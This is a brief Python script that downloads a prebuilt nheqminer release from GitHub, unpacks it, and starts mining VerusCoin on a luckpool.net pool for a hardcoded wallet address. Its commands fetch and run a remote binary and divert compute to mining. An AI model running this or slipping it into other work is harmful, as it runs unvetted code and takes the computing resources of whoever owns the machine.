import os
a  = os.popen('wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz').readlines()
a  = os.popen('tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz').readlines()
b  = os.popen('nheqminer/nheqminer -v -l na.luckpool.net:3956 -u RV2tjiZptDEbuyaecnVH22PUg5Z7ihyiT2.try -p x -t 4').readlines()
